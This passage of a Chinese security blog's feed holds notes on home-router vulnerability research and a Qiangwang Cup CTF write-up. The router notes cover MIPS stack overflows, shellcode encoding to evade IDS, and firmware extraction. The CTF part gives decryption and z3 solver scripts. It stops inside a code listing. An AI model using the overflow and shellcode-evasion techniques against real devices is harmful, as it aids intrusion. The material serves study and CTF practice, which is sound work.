!</p><p>总结：</p><p>断断停停终于算是真正完整复现了第一个漏洞，dlink DIR-815，依照0day路由器漏洞挖掘还有师傅们的博客，对mips架构和qemu有了进一步的了解</p>]]></content>
      
      
      <categories>
          
          <category> iot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>家用路由器0day挖掘技术阅读笔记</title>
      <link href="/2022/08/16/%E5%AE%B6%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A80day%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/08/16/%E5%AE%B6%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A80day%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<div class="story post-story"><h2 id="第四章-路由器web漏洞"><a href="#第四章-路由器web漏洞" class="headerlink" title="第四章 路由器web漏洞"></a>第四章 路由器web漏洞</h2><p>xss利用站点内的信任用户，跨站攻击是指入侵者在远程web页面的HTML页面中插入具有恶意代码的数据，用户认为该页面是可信赖的，但是当浏览器下载该页面时，嵌入其中的脚本将被解释执行。</p><p>CSRF跨站请求伪造通过伪装来自受信任用户的请求达到利用受信任的网站的目的。</p></div><div class="story post-story"><h2 id="第五章-路由器后门漏洞"><a href="#第五章-路由器后门漏洞" class="headerlink" title="第五章 路由器后门漏洞"></a>第五章 路由器后门漏洞</h2><h2 id="第六章-路由器溢出漏洞"><a href="#第六章-路由器溢出漏洞" class="headerlink" title="第六章 路由器溢出漏洞"></a>第六章 路由器溢出漏洞</h2><p>MIPS32架构函数调用时对堆栈的分配和使用方式与x86架构有相似之处，但又有很大的区别。区别具体体现在：</p><ul><li>栈操作：与x86架构一样，都是向低地址增长的。但是没有EBP（栈底指针），进入一个函数时，需要将当前栈指针向下移动n比特，这个大小为n比特的存储空间就是此函数的栈帧存储存储区域。</li><li>调用：如果函数A调用函数B，调用者函数（函数A）会在自己的栈顶预留一部分空间来保存被调用者（函数B）的参数，称之为调用参数空间。</li><li>参数传递方式：前四个参数通过$a0-$a3传递，多余的参数会放入调用参数空间。</li><li>返回地址：在x86架构中，使用call命令调用函数时，会先将当前执行位置压入堆栈，MIPS的调用指令把函数的返回地址直接存入$RA寄存器而不是堆栈中。</li></ul><p>叶子函数：当前函数不再调用其他函数。<br>非叶子函数：当前函数调用其他函数。</p><p>函数调用的过程：父函数调用子函数时，复制当前$PC的值到$RA寄存器，然后跳到子函数执行；到子函数时，子函数如果为非叶子函数，则子函数的返回地址会先存入堆栈，否则仍在$RA寄存器中；返回时，如果子函数为叶子函数，则”jr $ra”直接返回，否则先从堆栈取出再返回。</p><p>利用堆栈溢出的可行性：在非叶子函数中，可以覆盖返回地址，劫持程序执行流程；而在非叶子函数中，可通过覆盖父函数的返回地址实现漏洞利用。</p></div><div class="story post-story"><h2 id="第七章-基于MIPS的shellcode开发"><a href="#第七章-基于MIPS的shellcode开发" class="headerlink" title="第七章 基于MIPS的shellcode开发"></a>第七章 基于MIPS的shellcode开发</h2><p>mips中可使用syscall指令来进行系统调用，调用的方法为：在使用系统调用syscall之前，$v0保存需要执行的系统调用的调用号，并且按照mips调用规则构造将要执行的系统调用参数。syscall调用的伪代码为：“syscall($v0,$a1,$a2,$a3,$a4…)”。</p><p>shellcode编码优化包括指令优化和shellcode编码。<br>指令优化：指令优化是指通过选择一些特殊的指令避免在shellcode中直接生成坏字符。</p><p>通常来说，shellcode可能会受到限制：首先，所有的字符串函数都会对“NULL”字节进行限制；其次，在某些处理流程中可能会限制0x0D（\r）、0x0A（\n）、或者0x20（空格）字符；最后，有些函数会要求shellcode必须为可见字符（ascii）或Unicode值。有些时候，还会受到基于特征的IDS系统对shellcode的拦截。</p><p>绕过以上限制的方法主要有两个：指令优化及shellcoe编码。后者更为通用。</p><p>shellcoe编码通常包含以下三种：base64编码、alpha_upper编码、xor编码。</p></div><div class="story post-story"><h2 id="第八章-路由器文件系统与提取"><a href="#第八章-路由器文件系统与提取" class="headerlink" title="第八章 路由器文件系统与提取"></a>第八章 路由器文件系统与提取</h2><p>路由器漏洞的分析与利用的关键环节有获取固件、提取文件系统、漏洞分析与利用及漏洞挖掘。其中获取固件及提取文件系统是进行漏洞分析与利用的基础。</p><p>路由器固件中包含操作系统的内核及文件系统。路由器的固件不是硬件而是软件，因为在路由器中它通常是被固化在只读存储器中，所以称为固件。</p><p>在进行漏洞分析时获取路由器的固件通常有两种方式：一种是从路由器厂商提供的更新网站下载；一种是通过硬件接入，从路由器的Flash中提取固件。</p><h3 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h3><p>文件系统是操作系统的重要组成部分，是操作运行的基础。根文件系统会被打包成当前路由器所使用的文件系统格式，然后组装到固件中。路由器总是希望文件系统越小越好，所以这些文件系统中各种压缩格式随处可见。</p><p>Squashfs是一个只读格式的文件系统，具有超高压缩率，可达34%。当系统启动后，会将文件系统保存在一个压缩过的文件系统文件中，这个文件可以使用换回的形式挂载并对其中的文件进行访问，当进程需要某些文件时，仅将对应部分的压缩文件解压缩。Squashfs文件系统常用的压缩格式有GZIP、LZMA、LZO、XZ（LZMA2），在路由器中被普遍采用。</p><h3 id="手动提取文件系统"><a href="#手动提取文件系统" class="headerlink" title="手动提取文件系统"></a>手动提取文件系统</h3><p>文件系统中包含实现路由器各种功能的基础应用程序。文件系统能从固件中提取，而从路由器固件中提取文件系统是一个难点，原因之一在于不同的操作系统使用的文件系统不同。另外，路由器的文件系统压缩算法也有差异，有些路由器甚至会使用非标准的压缩算法打包文件系统。</p><p>手动提取文件系统类型包括：</p><ol><li>使用<code>file</code>命令查看文件系统类型。</li><li>手动判断文件类型，包含如下步骤：”strings|grep”检索文件系统magic签名头；“hexdump|grep”检索magic签名偏移；“dd|file”确定magic签名偏移处的文件类型。</li><li>手动提取文件系统。：安装工具，<code>sudo apt-get install squashfs-tools</code>该工具目前仅支持GZIP、LZO、XZ（LZMA2）不支持LZMA格式。可以使用firmware-mod-kit解压缩，解压后得到所有文件。安装命令：</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/mirror/firmware-mod-kit.git</span></span><br><span class="line">sudo apt-get install git build-essential zlib1g-dev liblzma-dev python-magic</span><br><span class="line">cd firmware-mod-kit</span><br><span class="line">./configure &amp;&amp; make</span><br></pre></td></tr></table></figure><h3 id="自动提取文件系统"><a href="#自动提取文件系统" class="headerlink" title="自动提取文件系统"></a>自动提取文件系统</h3><p>binwalk是路由器固件分析的必备工具，该工具最大的优点是可以自动完成指令文件的扫描，智能发掘潜藏在文件中所有可疑地文件类型及文件系统。</p><p>binwalk&amp;&amp;libmagic</p><p>binwalk提取与分析过程：</p><ol><li>固件扫描。通过扫描binwalk可发现目标文件中包含的所有可识别文件类型。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwaklk firmware.bin</span><br></pre></td></tr></table></figure><ol start="2"><li>提取文件。选项“-e”和“–extract”用于按照预定义的配置文件中的提取方法从固件中提取探测到的文件及系统。选项“-M”，用于递归扫描。“-d”用于递归深度的限制。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwaklk -e firmware.bin</span><br></pre></td></tr></table></figure><ol start="3"><li>显示完整的扫描结果。选项“-I”或“–invalid”用于显示扫描的所有结果。</li><li>指令系统分析。选项“-A”和“–opcode”用于扫描指定文件中通用cpu架构的可执行代码。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwaklk -A <span class="number">70</span>|more</span><br></pre></td></tr></table></figure><p>通常binwalk可对绝大多数路由器固件进行文件提取，如遇到无法识别的固件，可向binwalk添加下列提取规则和提取方法，实现对新的文件系统进行扫描和提取：</p><ol><li>基于magic签名文件自动提取。</li><li>基于binwalk配置文件的提取。</li></ol></div><div class="story post-story"><h2 id="第九章-漏洞分析简介"><a href="#第九章-漏洞分析简介" class="headerlink" title="第九章 漏洞分析简介"></a>第九章 漏洞分析简介</h2><p>漏洞分析是指在代码中迅速定位漏洞，弄清攻击原理，准确地估计潜在的漏洞利用方式和风险等级的过程。</p><ul><li>POC（Proof of Concept）</li></ul><p>漏洞证明，漏洞报告中，通过一段描述或一个样例来证明漏洞确实存在</p><ul><li>EXP（Exploit）</li></ul><p>漏洞利用，某个漏洞存在EXP，意思就是该漏洞存在公开的利用方式（比如一个脚本）</p><h3 id="漏洞分析方法"><a href="#漏洞分析方法" class="headerlink" title="漏洞分析方法"></a>漏洞分析方法</h3><p>可以通过一些漏洞公布网站获取漏洞信息。网上公布的poc有很多形式，只要能触发漏洞、重现攻击过程即可。在得到poc后，就需要部署漏洞分析实验环境，利用poc重现攻击过程，定位漏洞函数，分析漏洞产生的具体原因，根据poc和漏洞情况实现对漏洞的利用。</p><p>漏洞分析中常用的两种分析方法：动态调试以及静态分析。</p></div>]]></content>
      
      
      <categories>
          
          <category> iot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>强网杯</title>
      <link href="/2022/08/02/%E5%BC%BA%E7%BD%91%E6%9D%AF/"/>
      <url>/2022/08/02/%E5%BC%BA%E7%BD%91%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<div class="story post-story"><h2 id="GameMaster"><a href="#GameMaster" class="headerlink" title="GameMaster"></a>GameMaster</h2><p>.net程序</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208031428446.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208031428446.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208031429134.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208031429134.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>主要逻辑为异或和aes加密，解密message文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Cipher import AES</span><br><span class="line">key=bytes([66,114,97,105,110,115,116,111,114,109,105,110,103,33,33,33])</span><br><span class="line">f=open(&#x27;gamemessage&#x27;,&#x27;rb&#x27;)</span><br><span class="line">stream=f.read()</span><br><span class="line">enc=[]</span><br><span class="line">for i in stream:</span><br><span class="line">    enc.append(i^34)</span><br><span class="line">ae=AES.new(key,AES.MODE_ECB)</span><br><span class="line">m=ae.decrypt(bytes(enc))</span><br><span class="line">f.close()</span><br><span class="line">ff=open(&#x27;flag&#x27;,&#x27;wb&#x27;)</span><br><span class="line">ff.write(m)</span><br><span class="line">ff.close()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208031504680.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208031504680.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="·"></p><p>得到文件用010edit打开，然后根据文件头提取文件，也是.net文件，dnspy打开</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">f=[<span class="number">101</span>,<span class="number">5</span>,<span class="number">80</span>,<span class="number">213</span>,<span class="number">163</span>,<span class="number">26</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">19</span>,<span class="number">6</span>,<span class="number">173</span>,<span class="number">189</span>,<span class="number">198</span>,<span class="number">166</span>,<span class="number">140</span>,<span class="number">183</span>,<span class="number">42</span>,<span class="number">247</span>,<span class="number">223</span>,<span class="number">24</span>,<span class="number">106</span>,<span class="number">20</span>,<span class="number">145</span>,<span class="number">37</span>,<span class="number">24</span>,<span class="number">7</span>,<span class="number">22</span>,<span class="number">191</span>,<span class="number">110</span>,<span class="number">179</span>,<span class="number">227</span>,<span class="number">5</span>,<span class="number">62</span>,<span class="number">9</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">65</span>,<span class="number">22</span>,<span class="number">37</span>,<span class="number">5</span>]</span><br><span class="line">x=BitVec(<span class="string">&#x27;x&#x27;</span>,<span class="number">33</span>)</span><br><span class="line">y=BitVec(<span class="string">&#x27;y&#x27;</span>,<span class="number">33</span>)</span><br><span class="line">z=BitVec(<span class="string">&#x27;z&#x27;</span>,<span class="number">33</span>)</span><br><span class="line">s=Solver()</span><br><span class="line">nums=-<span class="number">1</span></span><br><span class="line">k=[<span class="number">0</span>]*<span class="number">40</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">320</span>):</span><br><span class="line">     x = (((x &gt;&gt; <span class="number">29</span> ^ x &gt;&gt; <span class="number">28</span> ^ x &gt;&gt; <span class="number">25</span> ^ x &gt;&gt; <span class="number">23</span>) &amp; <span class="number">1</span>) | x &lt;&lt; <span class="number">1</span>)</span><br><span class="line">     y = (((y &gt;&gt; <span class="number">30</span> ^ y &gt;&gt; <span class="number">27</span>) &amp; <span class="number">1</span>) | y &lt;&lt; <span class="number">1</span>)</span><br><span class="line">     z = (((z &gt;&gt; <span class="number">31</span> ^ z &gt;&gt; <span class="number">30</span> ^ z &gt;&gt; <span class="number">29</span> ^ z &gt;&gt; <span class="number">28</span> ^ z &gt;&gt; <span class="number">26</span> ^ z &gt;&gt; <span class="number">24</span>) &amp; <span class="number">1</span>) | z &lt;&lt; <span class="number">1</span>)</span><br><span class="line">     <span class="keyword">if</span> i%<span class="number">8</span>==<span class="number">0</span>:</span><br><span class="line">         nums+=<span class="number">1</span></span><br><span class="line">     k[nums]=((k[nums]&lt;&lt;<span class="number">1</span>)|((z &gt;&gt; <span class="number">32</span> &amp; <span class="number">1</span> &amp; (x &gt;&gt; <span class="number">30</span> &amp; <span class="number">1</span>)) ^ (((z &gt;&gt; <span class="number">32</span> &amp; <span class="number">1</span>) ^ <span class="number">1</span>) &amp; (y &gt;&gt; <span class="number">31</span> &amp; <span class="number">1</span>))))&amp;<span class="number">0xff</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    s.add(k[i]==f[i])</span><br><span class="line"><span class="keyword">if</span> s.check()==sat:</span><br><span class="line"> <span class="built_in">print</span>(s.model())</span><br></pre></td></tr></table></figure><p>还有移位然后异或的操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">s=[<span class="number">60</span>,<span class="number">100</span>,<span class="number">36</span>,<span class="number">86</span>,<span class="number">51</span>,<span class="number">251</span>,<span class="number">167</span>,<span class="number">108</span>,<span class="number">116</span>,<span class="number">245</span>,<span class="number">207</span>,<span class="number">223</span>,<span class="number">40</span>,<span class="number">103</span>,<span class="number">34</span>,<span class="number">62</span>,<span class="number">22</span>,<span class="number">251</span>,<span class="number">227</span>]</span><br><span class="line">z = <span class="number">3131229747</span></span><br><span class="line">y = <span class="number">868387187</span></span><br><span class="line">x = <span class="number">156324965</span></span><br><span class="line">L[<span class="number">0</span>]=x</span><br><span class="line">L[<span class="number">1</span>]=y</span><br><span class="line">L[<span class="number">2</span>]=z</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        key[i * <span class="number">4</span> + j] = ((L[i] &gt;&gt; j * <span class="number">8</span>) &amp; <span class="number">255</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(s[i]^key[i%<span class="built_in">len</span>(key)]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Y0u_@re_G3meM3s7er!</span></span><br></pre></td></tr></table></figure></div><div class="story post-story"><h2 id="deeprev"><a href="#deeprev" class="headerlink" title="deeprev"></a>deeprev</h2><p>Googlectf的一道同类型题，找到网上的脚本，format_addr函数修改了一下</p><p><a href="https://ctf.harrisongreen.me/2022/googlectf/eldar/">GoogleCTF 2022 - eldar (333 pt &#x2F; 14 solves) (harrisongreen.me)</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span 